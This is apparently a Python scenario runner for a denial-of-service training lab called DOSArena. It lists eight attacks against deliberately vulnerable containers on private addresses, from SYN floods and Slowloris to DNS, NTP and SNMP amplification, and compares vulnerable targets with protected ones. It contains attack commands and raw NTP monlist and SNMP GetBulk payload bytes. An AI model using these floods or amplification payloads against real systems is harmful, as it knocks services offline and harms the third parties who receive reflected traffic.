#!/usr/bin/env python3
"""
scenarios/run.py
Interactive scenario runner for DOSArena.

Usage:
  python3 run.py list
  python3 run.py run <scenario_id>
  python3 run.py check <scenario_id>
"""

import sys
import subprocess
import time
import socket

SCENARIOS = {
    "01": {
        "name": "SYN Flood — SYN Cookies Absent",
        "target": "10.0.2.20",
        "port": 80,
        "description": """
Objective:
  Demonstrate that apache-vuln (10.0.2.20) has no SYN cookie protection.
  A SYN flood should fill the backlog and make the server unresponsive.

Expected result (vulnerable):
  - ss -s on monitor shows SYN-RECV climbing
  - curl --connect-timeout 3 http://10.0.2.20/ times out

Contrast (protected):
  - Same attack on 10.0.3.20 (apache-protected): server keeps responding
  - SYN cookies absorb the flood without allocating memory

Commands:
  # Check current SYN cookie status on target (need SSH or exec)
  docker compose exec apache-vuln sysctl net.ipv4.tcp_syncookies
  # Should return: net.ipv4.tcp_syncookies = 0

  # Launch SYN flood
  sudo python3 /opt/dosarena/dosarena/cli/main.py syn 10.0.2.20 80 -t 8 -d 60

  # Monitor (separate terminal)
  docker compose exec monitor watch -n1 'ss -s'
""",
        "check_cmd": ["curl", "--connect-timeout", "3", "http://10.0.2.20/"],
        "check_expect_fail": True,
    },
    "02": {
        "name": "Slowloris — Apache Thread Pool Exhaustion",
        "target": "10.0.2.20",
        "port": 80,
        "description": """
Objective:
  Exhaust Apache's MaxRequestWorkers (150) with slow connections.
  No root required.

Expected result (vulnerable):
  - 200 slow sockets open
  - curl http://10.0.2.20/ hangs or returns connection refused
  - Apache error log: "server reached MaxRequestWorkers"

Contrast (protected):
  - Same attack on 10.0.3.20: mod_reqtimeout kills slow connections in 10-20s
  - Worker pool never fills

Commands:
  # Launch Slowloris
  python3 /opt/dosarena/dosarena/cli/main.py slow 10.0.2.20 -s 200 -d 120

  # Test server availability (other terminal)
  while true; do
    curl --connect-timeout 3 -s -o /dev/null -w "%{http_code}\\n" http://10.0.2.20/
    sleep 1
  done

  # Check worker count on monitor
  docker compose exec monitor sh -c \\
    'ss -tn state established dst 10.0.2.20:80 | wc -l'
""",
        "check_cmd": ["curl", "--connect-timeout", "3", "http://10.0.2.20/"],
        "check_expect_fail": True,
    },
    "03": {
        "name": "ACK Flood — Stateless vs Stateful Firewall",
        "target": "10.0.2.50",
        "port": 80,
        "description": """
Objective:
  Send ACK packets to both firewalls.
  Stateless (10.0.2.50): ACKs pass through -> server receives them.
  Stateful  (10.0.2.51): ACKs dropped     -> server never sees them.

Expected result:
  - tcpdump on fw-stateless: ACK packets arriving at nginx
  - tcpdump on fw-stateful:  no ACK packets reaching nginx

Commands:
  # Terminal 1: monitor stateless firewall
  docker compose exec monitor \\
    tcpdump -i eth0 -n 'host 10.0.2.50 and tcp[tcpflags] & tcp-ack != 0'

  # Terminal 2: monitor stateful firewall
  docker compose exec monitor \\
    tcpdump -i eth0 -n 'host 10.0.2.51 and tcp[tcpflags] & tcp-ack != 0'

  # Terminal 3: launch ACK flood toward stateless
  sudo python3 /opt/dosarena/dosarena/cli/main.py ack 10.0.2.50 80 -t 4 -d 30

  # Repeat toward stateful — should see no ACKs in tcpdump
  sudo python3 /opt/dosarena/dosarena/cli/main.py ack 10.0.2.51 80 -t 4 -d 30
""",
        "check_cmd": None,
        "check_expect_fail": False,
    },
    "04": {
        "name": "DNS Amplification — Open Resolver Detection",
        "target": "10.0.2.30",
        "port": 53,
        "description": """
Objective:
  Verify dns-open is an open resolver responding to ANY queries.
  Measure the amplification factor.

Expected result:
  - dig ANY returns large response -> open resolver confirmed
  - Amplification factor: request_size vs response_size

Commands:
  # Check if open resolver
  dig @10.0.2.30 isc.org ANY

  # Measure amplification factor
  REQ=$(echo -n "" | dig @10.0.2.30 isc.org ANY | wc -c)
  echo "Request size: ~50 bytes"
  echo "Response size: ~$(dig @10.0.2.30 isc.org ANY | wc -c) bytes"

  # Calculate factor
  python3 -c "print(f'Amplification: ~{$(dig @10.0.2.30 isc.org ANY | wc -c)/50:.0f}x')"

  # Test: is it closed? (should timeout or refuse)
  dig @10.0.3.1 isc.org ANY  # Should fail (no open resolver on protected subnet)
""",
        "check_cmd": None,
        "check_expect_fail": False,
    },
    "05": {
        "name": "NTP Amplification — monlist Probe",
        "target": "10.0.2.31",
        "port": 123,
        "description": """
Objective:
  Verify ntp-vuln responds to monlist (mode 7).
  Calculate the amplification factor (~550x).

Expected result:
  - ntpdc monlist returns list of clients -> vulnerable
  - Response is ~43,200 bytes for an 8-byte request

Commands:
  # Check monlist
  ntpdc -c monlist 10.0.2.31

  # Or with nmap
  nmap -sU -p 123 --script ntp-monlist 10.0.2.31

  # Measure response size
  python3 -c "
import socket, struct
payload = bytes([0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(2)
s.sendto(payload, ('10.0.2.31', 123))
try:
    data, _ = s.recvfrom(65535)
    print(f'Request:  8 bytes')
    print(f'Response: {len(data)} bytes')
    print(f'Factor:   ~{len(data)/8:.0f}x')
except: print('No response (patched or unreachable)')
"
""",
        "check_cmd": None,
        "check_expect_fail": False,
    },
    "06": {
        "name": "SNMP Amplification — GetBulk Factor",
        "target": "10.0.2.32",
        "port": 161,
        "description": """
Objective:
  Verify snmp-vuln responds to GetBulk with community 'public'.
  Measure the amplification factor (~650x).

Expected result:
  - snmpwalk returns MIB-II data -> vulnerable
  - GetBulk response is much larger than request

Commands:
  # Basic check
  snmpwalk -v2c -c public 10.0.2.32 .1.3.6.1.2.1.1

  # Measure amplification
  python3 -c "
import socket
# SNMP v2c GetBulkRequest (BER-encoded)
payload = bytes([
    0x30,0x26,0x02,0x01,0x01,0x04,0x06,0x70,0x75,0x62,0x6c,0x69,0x63,
    0xa5,0x19,0x02,0x04,0x00,0x00,0x00,0x01,0x02,0x01,0x00,0x02,0x01,
    0xff,0x30,0x0b,0x30,0x09,0x06,0x05,0x2b,0x06,0x01,0x02,0x01,0x05,0x00
])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(2)
s.sendto(payload, ('10.0.2.32', 161))
total = 0
try:
    while True:
        d, _ = s.recvfrom(65535)
        total += len(d)
except: pass
print(f'Request:  {len(payload)} bytes')
print(f'Response: {total} bytes')
print(f'Factor:   ~{total//max(len(payload),1)}x')
"
""",
        "check_cmd": None,
        "check_expect_fail": False,
    },
    "07": {
        "name": "TCP Starvation — Database Connection Tables",
        "target": "10.0.2.40",
        "port": 3306,
        "description": """
Objective:
  Fill MySQL's connection table (max_connections=50) with idle TCP connections.
  No MySQL auth needed — just TCP connections.

Expected result:
  - 60 NUKE sockets opened
  - mysql -h 10.0.2.40 returns "Too many connections"

Commands:
  # Verify current MySQL connection limit
  mysql -h 10.0.2.40 -u root -parenapass -e "SHOW VARIABLES LIKE 'max_connections';"

  # Launch NUKE
  python3 /opt/dosarena/dosarena/cli/main.py nuke 10.0.2.40 \\
      --port 3306 -s 60 --variant hold -d 60

  # Test (other terminal)
  mysql -h 10.0.2.40 -u root -parenapass -e "SELECT 1;"
  # -> ERROR 1040 (HY000): Too many connections

  # Monitor connections
  docker compose exec monitor \\
    watch -n1 'ss -tn state established dport = :3306 | wc -l'
""",
        "check_cmd": None,
        "check_expect_fail": False,
    },
    "08": {
        "name": "Slow POST — RUDY body timeout abuse",
        "target": "10.0.2.20",
        "port": 80,
        "description": """
Objective:
  Exhaust apache-vuln's worker pool by sending HTTP POST requests with a
  Content-Length header but delivering the body one byte every ~10 seconds.
  Apache holds the connection open waiting for the body — RUDY attack.

Expected result:
  - Worker pool fills up (MaxRequestWorkers=150 connections held open)
  - curl --connect-timeout 3 http://10.0.2.20/ times out
  - apache-protected (10.0.3.20) resists: mod_reqtimeout body=10-30,MinRate=500

Contrast (protected):
  - apache-protected kills connections that send body slower than 500 B/s
  - Worker pool stays available even under the same attack

Commands:
  # Launch Slow POST flood (RUDY-style)
  python3 /opt/dosarena/dosarena/cli/main.py slowpost \\
      http://10.0.2.20/ -c 200 -d 120

  # Verify impact: should time out
  curl --connect-timeout 5 http://10.0.2.20/ -v

  # Monitor active connections on target
  ss -tn state established dport = :80 | wc -l

  # Compare: protected target keeps responding
  curl --connect-timeout 5 http://10.0.3.20/ -v
""",
        "check_cmd": None,
        "check_expect_fail": False,
    },
}


def list_scenarios():
    print("\nDOSArena — Available Scenarios")
    print("=" * 60)
    for sid, s in sorted(SCENARIOS.items()):
        print(f"  [{sid}] {s['name']}")
        print(f"        Target: {s['target']}:{s['port']}")
    print()


def run_scenario(sid: str):
    if sid not in SCENARIOS:
        print(f"[!] Unknown scenario: {sid}")
        sys.exit(1)
    s = SCENARIOS[sid]
    print(f"\n{'='*60}")
    print(f"  Scenario {sid}: {s['name']}")
    print(f"  Target: {s['target']}:{s['port']}")
    print(f"{'='*60}")
    print(s["description"])


def check_scenario(sid: str):
    if sid not in SCENARIOS:
        print(f"[!] Unknown scenario: {sid}")
        sys.exit(1)
    s = SCENARIOS[sid]
    if not s["check_cmd"]:
        print(f"[*] Scenario {sid} has no automated check. Manual verification required.")
        return

    print(f"[*] Checking scenario {sid}: {s['name']}")
    try:
        result = subprocess.run(
            s["check_cmd"],
            capture_output=True, timeout=10
        )
        failed = result.returncode != 0
        if s["check_expect_fail"]:
            if failed:
                print(f"[+] PASS — Target is responding as expected (vulnerable/unreachable)")
            else:
                print(f"[-] FAIL — Target still responding (attack may not be active)")
        else:
            if not failed:
                print(f"[+] PASS")
            else:
                print(f"[-] FAIL")
    except subprocess.TimeoutExpired:
        if s["check_expect_fail"]:
            print(f"[+] PASS — Connection timed out (server exhausted)")
        else:
            print(f"[-] FAIL — Unexpected timeout")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    cmd = sys.argv[1]
    if cmd == "list":
        list_scenarios()
    elif cmd == "run" and len(sys.argv) == 3:
        run_scenario(sys.argv[2])
    elif cmd == "check" and len(sys.argv) == 3:
        check_scenario(sys.argv[2])
    else:
        print(__doc__)
        sys.exit(1)
